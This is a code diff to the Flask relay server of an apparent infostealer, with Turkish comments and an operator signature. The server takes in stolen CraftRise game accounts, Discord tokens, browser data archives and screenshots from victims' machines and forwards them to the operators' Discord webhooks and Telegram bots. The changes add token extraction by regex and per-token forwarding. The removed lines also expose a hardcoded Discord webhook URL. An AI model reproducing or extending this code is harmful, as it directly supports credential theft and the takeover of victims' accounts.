@@ -12,7 +12,7 @@ app = Flask(__name__)
 # ENVIRONMENT VARIABLES
 # ============================================================================
 WEBHOOK = os.environ.get("WEBHOOK", "")
-WEBHOOK_1 = os.environ.get("WEBHOOK_1", "https://discord.com/api/webhooks/1534721356728373441/DcQUFVUvjYIGHYdNfjQZuUbgqu4d9TJfPMFLmH7QdnepfUhcVCVTSVPvYufwSp6Jqv74")
+WEBHOOK_1 = os.environ.get("WEBHOOK_1", "")
 WEBHOOK_2 = os.environ.get("WEBHOOK_2", "")
 
 TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
@@ -42,67 +42,68 @@ LOGO_SIGN = "https://media.discordapp.net/attachments/1531817920907448421/153504
 # ============================================================================
 def send_telegram_msg(token, chat_id, msg):
     if not (token and chat_id and msg):
-        return
+        return False
     try:
-        requests.post(
+        resp = requests.post(
             f"https://api.telegram.org/bot{token}/sendMessage",
             json={"chat_id": chat_id, "text": msg[:4000]},
             timeout=30
         )
+        return resp.status_code == 200
     except Exception as e:
         print(f"[-] Telegram msg error: {e}")
+        return False
 
 def send_telegram_file(token, chat_id, file_bytes, filename="backup.zip", caption=""):
     if not (token and chat_id and file_bytes):
-        return
+        return False
     try:
         files = {'document': (filename, file_bytes)}
-        requests.post(
+        resp = requests.post(
             f"https://api.telegram.org/bot{token}/sendDocument",
             data={"chat_id": chat_id, "caption": caption[:1000]},
             files=files,
             timeout=60
         )
+        return resp.status_code == 200
     except Exception as e:
         print(f"[-] Telegram file error: {e}")
+        return False
 
 def send_telegram_photo(token, chat_id, photo_bytes, caption=""):
     if not (token and chat_id and photo_bytes):
-        return
+        return False
     try:
         files = {'photo': ('screenshot.png', photo_bytes)}
-        requests.post(
+        resp = requests.post(
             f"https://api.telegram.org/bot{token}/sendPhoto",
             data={"chat_id": chat_id, "caption": caption[:1000]},
             files=files,
             timeout=60
         )
+        return resp.status_code == 200
     except Exception as e:
         print(f"[-] Telegram photo error: {e}")
+        return False
 
 # ============================================================================
 # DISCORD FUNCTIONS
 # ============================================================================
 def send_discord(url, data, files=None):
     if not url:
-        return
+        return False
     try:
         if files:
             response = requests.post(url, data=data, files=files, timeout=60)
             print(f"[+] Discord sent file to {url[:50]}... status: {response.status_code}")
+            return response.status_code in [200, 204]
         else:
             response = requests.post(url, json=data, timeout=30)
             print(f"[+] Discord sent embed to {url[:50]}... status: {response.status_code}")
+            return response.status_code in [200, 204]
     except Exception as e:
         print(f"[-] Discord error: {e}")
-
-def send_to_both_webhooks(data, files=None):
-    """Her iki webhook'a da gönder"""
-    if WEBHOOK_1:
-        send_discord(WEBHOOK_1, data, files)
-    
-    if WEBHOOK_2:
-        send_discord(WEBHOOK_2, data, files)
+        return False
 
 # ============================================================================
 # MAIN WEBHOOK
@@ -131,6 +132,7 @@ def webhook():
 
         log_type = data.get("type", "unknown")
         hostname = data.get("hostname", "Unknown")
+        content = data.get("content", "")
         
         embeds = data.get("embeds", [])
         if not isinstance(embeds, list):
@@ -150,11 +152,19 @@ def webhook():
                         if field.get("name") == "Account":
                             account_info = field.get("value", "Unknown")
                             break
+            else:
+                # content'ten çek
+                if content:
+                    match = re.search(r'`([^`]+)`', content)
+                    if match:
+                        account_info = match.group(1)
             
-            # Craftrise hesabını sadece Craftrise webhook ve telegram'a gönder
+            print(f"[*] CraftRise Account: {account_info}")
+            
+            # Craftrise hesabını CraftRise webhook ve telegram'a gönder
             cr_embed = {
                 "embeds": [{
-                    "title": "CraftRise",
+                    "title": "🎮 CraftRise",
                     "color": 0xFF6B00,
                     "thumbnail": {"url": LOGO_CRAFTRISE},
                     "fields": [
@@ -168,60 +178,56 @@ def webhook():
             if CRAFTRISE_WEBHOOK:
                 send_discord(CRAFTRISE_WEBHOOK, cr_embed)
             
-            send_telegram_msg(CRAFTRISE_TELEGRAM_TOKEN, CRAFTRISE_TELEGRAM_CHAT_ID, f"CraftRise\n{account_info}")
+            send_telegram_msg(CRAFTRISE_TELEGRAM_TOKEN, CRAFTRISE_TELEGRAM_CHAT_ID, f"🎮 CraftRise\n{account_info}")
 
         # ============================================================
         # DISCORD TOKEN (type: discord)
         # ============================================================
         elif log_type == "discord":
-            token_count = 0
-            status_text = "YOK"
+            print(f"[*] Discord Token gönderimi alındı")
             
-            if embeds:
+            # Token'ı content'ten çek
+            token = None
+            if content:
+                match = re.search(r'🔑\s*\*\*Token:\*\*\s*`([^`]+)`', content)
+                if match:
+                    token = match.group(1)
+            
+            if not token and embeds:
                 for embed in embeds:
                     fields = embed.get("fields", [])
                     for field in fields:
-                        if field.get("name") == "Status":
-                            status_text = field.get("value", "YOK")
-                            match = re.search(r'MEVCUT\s*(\d+)X', status_text)
-                            if match:
-                                token_count = int(match.group(1))
+                        if field.get("name") == "🔑 Token":
+                            token = field.get("value", "").strip('`').strip()
                             break
             
-            # Discord token'larını Discord webhook ve telegram'a gönder
-            discord_embed = {
-                "embeds": [{
-                    "title": "Discord Token",
-                    "color": 0x5865F2,
-                    "thumbnail": {"url": LOGO_DISCORD},
-                    "fields": [
-                        {"name": "Status", "value": status_text, "inline": False},
-                        {"name": "PC", "value": hostname, "inline": False},
-                        {"name": "Signature", "value": "S4/Mr.cekikgozlusampiyon", "inline": False}
-                    ],
-                    "timestamp": datetime.utcnow().isoformat()
-                }]
-            }
-            
-            if DISCORD_WEBHOOK:
+            # Discord Webhook'a gönder
+            if DISCORD_WEBHOOK and token:
+                discord_embed = {
+                    "embeds": [{
+                        "title": "💎 Discord Token",
+                        "color": 0x5865F2,
+                        "thumbnail": {"url": LOGO_DISCORD},
+                        "fields": [
+                            {"name": "Token", "value": f"```fix\n{token}\n```", "inline": False},
+                            {"name": "PC", "value": hostname, "inline": False},
+                            {"name": "Signature", "value": "S4/Mr.cekikgozlusampiyon", "inline": False}
+                        ],
+                        "timestamp": datetime.utcnow().isoformat()
+                    }]
+                }
                 send_discord(DISCORD_WEBHOOK, discord_embed)
             
-            # Token'ları teker teker Telegram'a gönder
-            tokens = data.get("tokens", [])
-            if isinstance(tokens, str):
-                try:
-                    tokens = json.loads(tokens)
-                except:
-                    tokens = [tokens] if tokens else []
-            
-            if tokens and len(tokens) > 0:
-                for token in tokens:
-                    send_telegram_msg(DISCORD_TELEGRAM_TOKEN, DISCORD_TELEGRAM_CHAT_ID, f"Discord\nToken: {token}")
+            # Token'ı Discord Telegram'a gönder
+            if token:
+                send_telegram_msg(DISCORD_TELEGRAM_TOKEN, DISCORD_TELEGRAM_CHAT_ID, f"💎 Discord Token\n{token}")
 
         # ============================================================
-        # MASTER (type: master veya boş) - Browser Stats + ZIP + Screenshot
+        # MASTER (type: browser veya boş) - Browser Stats + ZIP + Screenshot
         # ============================================================
         else:
+            print(f"[*] Master gönderimi - {log_type}")
+            
             # Embeds'e imza ve thumbnail ekle
             if embeds:
                 for embed in embeds:
@@ -241,8 +247,6 @@ def webhook():
                         embed["footer"] = {"text": "Cekıkgozlusampiyon / discord.gg/s4s4"}
                     if "thumbnail" not in embed:
                         embed["thumbnail"] = {"url": LOGO_SIGN}
-            
-            content = data.get("content", "")
             
             # MASTER_WEBHOOK (ZIP + Embed + Screenshot)
             if MASTER_WEBHOOK:
@@ -318,7 +322,7 @@ def webhook():
 
 @app.route('/')
 def home():
-    return "Proxy Active"
+    return "HollyShit Proxy Active"
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
